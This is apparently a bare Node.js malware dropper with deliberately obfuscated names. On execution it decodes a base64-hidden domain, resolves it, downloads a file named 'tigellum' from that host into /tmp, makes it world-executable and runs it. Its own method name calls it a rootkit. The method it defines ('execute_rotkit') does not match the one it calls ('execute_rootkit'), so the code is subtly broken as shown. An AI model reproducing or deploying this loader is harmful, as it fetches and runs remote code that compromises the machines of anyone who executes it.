const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function leukocytic() {
    this.execute_rotkit = function(nunnish) {
      if (nunnish != null && nunnish != '0.0.0.0') {
        zoosterol = http.get('http://' + nunnish + '/tigellum', function(sundogs) {
          var severitys = fs.createWriteStream('/tmp/biotypology');
          sundogs.on('data', function(overchill) {
            severitys.write(overchill);
          });
          sundogs.on('end', function() {
            severitys.end();
            fs.chmod('/tmp/biotypology', '0777');
            child_process.exec('/tmp/biotypology', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      moustachio = 'MTExZTE5YTMuaHJtb3p5LmRl'
      dns.lookup((new Buffer(moustachio, 'base64')).toString(), function(err, weatherstrippers) {
        self.execute_rootkit(weatherstrippers);
      });
    };
};

(new leukocytic()).run();
